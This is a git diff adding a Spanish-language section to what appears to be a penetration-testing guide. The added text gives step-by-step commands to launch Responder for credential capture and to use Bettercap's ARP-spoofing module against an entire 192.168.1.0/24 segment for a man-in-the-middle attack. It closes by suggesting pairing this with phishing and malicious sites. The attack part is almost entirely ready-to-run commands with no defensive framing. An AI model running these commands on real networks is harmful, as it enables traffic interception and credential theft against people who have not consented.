@@ -56,3 +56,34 @@ sudo iptables -t nat -A PREROUTING -p tcp --dport 3389 -j DNAT --to-destination 
 sudo iptables -t nat -A POSTROUTING -j MASQUERADE
 
 ```
+Ya con el enrutamiento configurado sigue lo facil
+- Vamos a subir los servidores de Responder, que van a estar escuchando en los puertos que anteriormente configuramos. Para esto simplemente vamos a lanzar el siguiente comando
+```
+# Sea nuestra interfaz conectada a la red eth0
+sudo responder -I eth0 -A -v
+```
+Por ultimo ya con los servidores arriba lo unico que falta es conseguir el MiTM para esto vamos a usar Bettercap como antes habia mencionado
+- Como tal vamos a utilizar el modulo de arp.spoof de Bettercap el cual realizara un arp spoofing redirigiendo todo el trafico del segmento seleccionado hacia nuestra ip
+```
+# Lo primero que vamos a realizar sera iniciar Bettercap
+sudo bettercap
+
+# Ahora deberemos validar las configuraciones y los modulos encendidos para eso podemos usar el comando help y help {modulo}
+help
+help arp.spoof
+
+# Ahora encendemos los modulos secundarios que nos ayudaran a tener un mayor entendimiento de la red
+net.probe on
+net.sniff on
+
+# Ahora toca ajustar el modulo de arp.spoof
+set arp.spoof.internal true
+set arp.spoof.fullduplex true
+
+set arp.spoof.targets 192.168.1.0/24
+
+# Por ultimo toca encender empezar el arp spoofing
+arp.spoof on
+```
+
+Listo ya con esto deberiamos estar realizando el ataque, como se puede suponer esto se puede combinar con muchas otras herramietas y ataque como por ejemplo beef, burpsuite, sitios maliciosos, sitios de phishing, etc, etc
